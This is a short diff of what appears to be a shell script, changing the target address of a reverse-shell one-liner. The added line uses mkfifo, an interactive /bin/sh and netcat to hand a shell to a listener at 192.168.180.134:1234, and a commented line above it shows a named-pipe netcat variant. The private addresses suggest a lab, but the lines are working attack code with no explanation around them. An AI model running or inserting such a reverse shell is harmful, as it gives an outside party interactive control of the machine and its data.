@@ -11,4 +11,4 @@ touch HelloWorld
 #rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 1234 0/tmp/p
 
 #don't work --- nc: Address already in use
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.180.134 1234 >/tmp/f
